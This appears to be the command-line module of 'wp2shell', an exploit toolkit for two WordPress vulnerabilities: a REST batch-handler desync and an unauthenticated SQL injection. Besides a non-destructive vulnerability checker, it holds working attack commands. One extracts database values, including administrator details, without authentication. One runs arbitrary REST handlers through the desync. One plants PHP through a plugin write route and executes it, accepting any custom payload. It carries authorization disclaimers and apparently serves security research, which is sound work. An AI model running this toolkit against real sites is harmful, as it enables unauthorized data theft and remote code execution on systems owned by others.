"""wp2shell — unified CLI for CVE-2026-63030 + CVE-2026-60137 research.

Subcommands:
  check       non-destructive detector (VULNERABLE / PATCHED / INCONCLUSIVE)
  sqli        unauthenticated blind/UNION SQLi via the nested batch (clean core)
  plugin-rce  code execution via a *vulnerable plugin* write route (lab demo)
  probe       confirm the desync via the handler-substitution signal
  seat        run an arbitrary target handler via the desync

AUTHORIZATION: run only against systems you own or are explicitly authorized to
test, on an isolated network. See AUTHORIZATION.md.
"""

import argparse
import json
import secrets
import sys

from . import desync, sqli
from .http import endpoints, http_get


def _resolve(base):
    url = desync.working_endpoint(base)
    if not url:
        print("[!] batch/v1 not reachable at", base, file=sys.stderr)
        sys.exit(2)
    return url


# ── check ───────────────────────────────────────────────────────────────────
def cmd_check(args):
    verdict, codes = "INCONCLUSIVE", None
    for url in endpoints(args.target):
        verdict, codes = desync.detect(url)
        if verdict != "INCONCLUSIVE" or codes:
            break
    if args.json:
        print(json.dumps({"target": args.target, "verdict": verdict, "codes": codes}, indent=2))
    else:
        print(f"[*] target : {args.target}")
        print(f"[*] req[1] categories -> {codes[1] if codes and len(codes) > 1 else '?'}")
        if verdict == "VULNERABLE":
            print("[+] VULNERABLE — handler desync present (CVE-2026-63030).")
            print("    Remediation: update WordPress core to >= 7.0.2 / >= 6.9.5.")
        elif verdict == "PATCHED":
            print("[-] NOT VULNERABLE — correct handler adjudicated the request.")
        else:
            print("[?] INCONCLUSIVE — batch/v1 unreachable, not WordPress, or altered upstream.")
    return {"VULNERABLE": 1, "PATCHED": 0}.get(verdict, 2)


# ── probe ───────────────────────────────────────────────────────────────────
def cmd_probe(args):
    url = _resolve(args.target)
    print(f"[*] endpoint: {url}")
    present = desync.desync_present(url)
    if present:
        print("[+] VULNERABLE: block-renderer's gate judged a posts DELETE (desync active).")
    else:
        print("[-] PATCHED: donor judged by its own handler.")
    return 1 if present else 0


# ── seat ────────────────────────────────────────────────────────────────────
def cmd_seat(args):
    url = _resolve(args.target)
    donor = {"method": args.donor_method, "path": args.donor_path}
    if args.donor_body:
        donor["body"] = json.loads(args.donor_body)
    target = {"method": args.target_method, "path": args.target_path}
    print(f"[*] layout: [malformed x{args.k}, DONOR {donor['method']} {donor['path']}, "
          f"TARGET {target['method']} {target['path']}]")
    _, responses, donor_resp = desync.seat(url, target, donor, k=args.k,
                                           cookies=args.cookie, nonce=args.nonce)
    print(json.dumps(responses, indent=2)[:4000])
    print("\n[*] executed-handler response (H fed the donor request):")
    print(json.dumps(donor_resp, indent=2)[:2000])
    return 0


# ── sqli ────────────────────────────────────────────────────────────────────
def cmd_sqli(args):
    url = _resolve(args.target)
    print("[*] Unauthenticated SQLi (CVE-2026-60137) via nested-batch desync (CVE-2026-63030)")
    mode, extract = sqli.choose_extractor(url, args.maxlen)
    if mode == "union":
        print("[+] UNION extraction working (one request/value, no published post required).")
    elif mode == "blind":
        print("[+] boolean-blind fallback (needs >=1 published post).")
    else:
        if desync.desync_present(url):
            print("[!] 63030 desync present, but the SQLi did not fire — CVE-2026-60137 likely patched")
            print("    (WP_Query uses wp_parse_id_list, neutralizing the author_exclude string).")
        else:
            print("[!] no desync signal — target appears PATCHED (63030 closed) or batch/v1 altered.")
        return 2

    assert extract is not None  # narrowed: the else-branch above returned
    if args.expr:
        print(f"    {args.expr} = {extract(args.expr)}")
        return 0
    prefix = sqli.detect_prefix(extract) or args.prefix
    print(f"[+] table prefix: {prefix!r}")
    for label, expr in sqli.SERVER_FACTS + sqli.admin_facts(prefix):
        print(f"    {label:13s}: {extract(expr)}")
    return 0


# ── plugin-rce ────────────────────────────────────────────────────────────────
# PLUGIN-ROUTE code-execution PoC (NOT a core capability). Uses the desync's
# sanitization bypass (P3) to write a benign PHP file (default: prints 6*7) to a
# *vulnerable plugin* write route, then fetches it to prove the server executes it.
# It needs that vulnerable route (the bundled lab/acme-templates.php models the
# common real-world anti-pattern). Stock core alone has no such unauth write sink;
# for the no-plugin path (SQLi -> read+write, and the withheld admin-takeover step)
# see docs/analysis.md section 4.2.
_WE_MARKER = "42-wp2shell-exec-poc"
_WE_PAYLOAD = '<?php echo (6 * 7) . "-wp2shell-exec-poc"; ?>'  # benign: no input, no syscalls


def _base_of(url):
    for sep in ("/wp-json/", "/?rest_route="):
        if sep in url:
            return url.split(sep, 1)[0]
    return url.rstrip("/")


def cmd_plugin_rce(args):
    url = _resolve(args.target)
    base = _base_of(url)
    print("[*] PLUGIN-ROUTE code-execution PoC via the CVE-2026-63030 desync (needs a vulnerable plugin)")
    if not desync.desync_present(url):
        print("[!] no desync signal — target appears PATCHED (63030 closed). Aborting.")
        return 2

    name = args.name or f"wp2shell_{secrets.token_hex(4)}.php"
    payload = args.payload
    custom = payload != _WE_PAYLOAD
    donor = {"method": "POST", "path": "/wp/v2/categories",
             "body": {args.name_field: name, args.content_field: payload}}
    target = {"method": args.method, "path": args.route}
    resp = desync.seat(url, target, donor, k=1)[2]
    body = resp.get("body") if isinstance(resp, dict) else None
    if not isinstance(body, dict) or "stored_file" not in body:
        code = desync.body_code(resp)
        if code == "rest_no_route":
            print(f"[!] route {args.route} is not registered — this is a LAB demo that needs a")
            print("    vulnerable write route. Install lab/acme-templates.php into the test site's")
            print("    wp-content/mu-plugins/ (or point --route at a real vulnerable plugin route).")
        else:
            print(f"[!] write did not succeed (code={code}):")
            print(json.dumps(resp, indent=2)[:800])
        return 2

    stored = str(body["stored_file"])
    planted = base + "/" + stored.lstrip("/")
    print(f"[+] wrote {body.get('bytes')} bytes of raw PHP to {stored}")
    print(f"    (a DIRECT call would have had its <?php stripped by wp_kses_post; the desync bypassed it)")

    fcode, ftext = http_get(planted)
    print(f"[*] GET {planted} -> HTTP {fcode}")
    rc = 2
    if "<?php" in ftext:
        print("[-] server returned PHP SOURCE — execution under uploads/ is denied (good hardening).")
        rc = 1
    elif custom:
        print(f"[+] handler executed; response body:\n    {ftext.strip()[:300]}")
        rc = 0
    elif _WE_MARKER in ftext:
        print(f"[+] server EXECUTED the PHP -> {ftext.strip()[:120]}")
        print("    => unauthenticated code execution confirmed (write + execute, no auth).")
        rc = 0
    else:
        print(f"[?] inconclusive; response body:\n    {ftext.strip()[:300]}")

    if args.keep:
        print(f"[*] --keep set; left the file in place: {stored}")
    else:
        neutral = {"method": "POST", "path": "/wp/v2/categories",
                   "body": {args.name_field: name, args.content_field: "<?php /* wp2shell poc removed */"}}
        desync.seat(url, target, neutral, k=1)
        print(f"[*] cleaned up: overwrote the planted file with an inert stub ({stored}).")
    return rc


def build_parser():
    ap = argparse.ArgumentParser(
        prog="wp2shell",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="CVE-2026-63030 + CVE-2026-60137 research PoC (authorized testing only).",
        epilog=(
            "command groups:\n"
            "  assessment — clean core, any authorized target:\n"
            "    check       is the target vulnerable? (non-destructive)\n"
            "    sqli        unauthenticated DB read via the clean-core chain\n"
            "  lab — needs a deliberately-vulnerable plugin you install (lab/acme-templates.php):\n"
            "    plugin-rce  unauth code execution via a vulnerable plugin write route\n"
            "  research (raw desync primitives):\n"
            "    probe       confirm the desync signal\n"
            "    seat        drive the desync primitive directly\n"))
    sub = ap.add_subparsers(dest="cmd", required=True)

    c = sub.add_parser("check", help="[assessment] non-destructive detector")
    c.add_argument("target")
    c.add_argument("--json", action="store_true")
    c.set_defaults(func=cmd_check)

    p = sub.add_parser("probe", help="[research] confirm the desync via handler-substitution signal")
    p.add_argument("target")
    p.set_defaults(func=cmd_probe)

    s = sub.add_parser("seat", help="[research] run an arbitrary target handler via the desync")
    s.add_argument("target")
    s.add_argument("--donor-method", default="DELETE")
    s.add_argument("--donor-path", default="/wp/v2/posts/0")
    s.add_argument("--donor-body", help="JSON dict delivered to the drifted handler")
    s.add_argument("--target-method", required=True)
    s.add_argument("--target-path", required=True)
    s.add_argument("--k", type=int, default=1, help="leading malformed count (drift)")
    s.add_argument("--cookie")
    s.add_argument("--nonce")
    s.set_defaults(func=cmd_seat)

    sq = sub.add_parser("sqli", help="[assessment] unauthenticated SQLi via nested batch (60137 + 63030)")
    sq.add_argument("target")
    sq.add_argument("--expr", help="custom SQL scalar expression to extract")
    sq.add_argument("--prefix", default="wp_", help="DB table prefix fallback (default wp_)")
    sq.add_argument("--maxlen", type=int, default=48, help="max chars per value (blind mode)")
    sq.set_defaults(func=cmd_sqli)

    we = sub.add_parser("plugin-rce",
                        help="[lab] code execution via a VULNERABLE PLUGIN write route (not core); "
                             "needs lab/acme-templates.php installed on the test site")
    we.add_argument("target")
    we.add_argument("--route", default="/acme/v1/save-file",
                    help="vulnerable write route (default: bundled lab/acme-templates.php)")
    we.add_argument("--method", default="POST")
    we.add_argument("--name-field", default="name", help="route param for the filename")
    we.add_argument("--content-field", default="content", help="route param for the file body")
    we.add_argument("--name", help="filename to write (default: random wp2shell_<hex>.php)")
    we.add_argument("--payload", default=_WE_PAYLOAD,
                    help="PHP to write (default: benign, prints 6*7); keep it non-destructive")
    we.add_argument("--keep", action="store_true", help="do not neutralize the planted file afterwards")
    we.set_defaults(func=cmd_plugin_rce)

    return ap


def main(argv=None):
    args = build_parser().parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
